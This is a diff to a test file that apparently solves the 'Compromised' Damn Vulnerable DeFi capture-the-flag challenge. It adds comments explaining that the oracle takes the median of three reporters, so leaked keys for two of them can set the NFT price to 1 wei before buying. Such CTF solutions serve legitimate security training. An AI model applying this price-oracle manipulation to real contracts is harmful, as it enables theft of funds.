@@ -58,7 +58,12 @@ describe('Compromised challenge', function () {
         const signer1 = new ethers.Wallet(PKEY1, ethers.provider);
         const signer2 = new ethers.Wallet(PKEY2, ethers.provider);
 
-        // Set Price - 1 WEI, and buy 1 NFT
+        // Set Price - 1 WEI, and buy 1 NFT 
+        // there are 3-trusters and price is finded using median of prices
+        // first all prices are sorted in ascending order
+        // get the median price
+        // so we post price to 1 wei
+        // and again post price to initial nft price
         await oracle.connect(signer1).postPrice("DVNFT", 1);
         await oracle.connect(signer2).postPrice("DVNFT", 1);
         await exchange.connect(player).buyOne({value: 1});
